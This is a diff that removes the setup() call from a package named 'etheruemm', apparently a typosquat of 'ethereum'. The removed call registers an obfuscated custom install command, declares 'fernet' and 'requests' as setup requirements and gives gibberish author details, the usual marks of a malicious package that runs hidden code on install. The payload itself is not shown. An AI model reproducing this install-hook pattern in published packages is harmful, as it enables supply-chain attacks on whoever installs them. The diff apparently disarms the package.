@@ -18,22 +18,5 @@ class bhCxNMiRZPgSAZtauOuKXZHOnnwuGARhvzGQDCtwgdMZzONMULGpTPWLwjSsTwFIkDAkZxMvsc
             install.run(self)
 
 
-setup(
-    name="etheruemm",
-    version=VERSION,
-    author="myvfPnMqmSzKMVJm",
-    author_email="fIuQsNdU@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': bhCxNMiRZPgSAZtauOuKXZHOnnwuGARhvzGQDCtwgdMZzONMULGpTPWLwjSsTwFIkDAkZxMvsccsWPPJdowpyVBhFhjJgVKmnDsCSHdMeyeYUSOlXXtvVtCIPeYOUaUQEEMOxgfTRJFsGCSQjFPdbrmnJrzzguzFEzXuhPSuKnawNzOFHDjZKEaifPS,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 
